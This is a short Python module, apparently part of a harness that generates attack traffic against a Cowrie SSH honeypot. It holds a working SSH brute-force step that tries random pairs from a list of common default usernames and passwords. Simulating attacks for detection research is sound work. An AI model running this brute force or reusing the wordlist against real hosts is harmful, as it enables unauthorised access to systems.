"""SSH brute force against Cowrie: one login attempt per step, from a seeded wordlist."""
import paramiko

ATTACK_TYPE = "ssh_brute"
DEFAULT_RATE = 2.0

USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "pi", "user", "git", "deploy"]
PASSWORDS = ["123456", "password", "admin", "root", "toor", "qwerty", "letmein", "12345678",
             "raspberry", "changeme", "P@ssw0rd", "welcome1", "111111", "abc123"]


def step(ctx):
    host, port = ctx.targets["ssh"]
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=ctx.rng.choice(USERS),
                       password=ctx.rng.choice(PASSWORDS), timeout=ctx.timeout,
                       allow_agent=False, look_for_keys=False, banner_timeout=ctx.timeout)
    finally:
        client.close()
